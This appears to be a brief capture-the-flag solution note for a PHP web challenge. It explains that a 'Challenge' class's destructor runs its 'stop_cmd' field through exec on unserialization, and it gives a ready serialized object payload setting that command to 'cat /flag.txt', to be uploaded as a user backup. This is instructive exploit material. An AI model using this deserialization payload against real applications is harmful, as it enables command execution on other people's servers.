#The class vulnerable to serialization is the one with destruct called Challenge.
#I have just changed the variable stop_cmd with "cat /flag.txt" and on unserialization, it automatically executes the cmd command "cat /flag.txt" with the exec of php
#Just upload it as a user backup and it will unserialize it and execute the command

#O:9:"Challenge":4:{s:4:"name";N;s:11:"description";N;s:9:"setup_cmd";N;s:8:"stop_cmd";s:13:"cat /flag.txt";}